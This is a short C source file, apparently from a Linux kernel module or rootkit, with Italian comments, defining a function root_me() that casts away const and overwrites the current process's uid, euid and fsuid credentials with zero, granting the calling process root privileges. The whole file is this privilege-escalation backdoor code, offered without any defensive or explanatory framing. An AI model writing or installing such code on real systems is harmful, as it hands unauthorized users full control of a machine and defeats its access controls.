#include <linux/sched.h>

#include "rootshell.h"

// garantisce i privilegi di root
void root_me(void)
{
  // evita errori di const del compilatore
  uid_t* v = (uid_t*) &current->cred->uid;
  *v = 0;
  v = (uid_t*) &current->cred->euid;
  *v = 0;
  v = (uid_t*) &current->cred->fsuid;
  *v = 0;
}
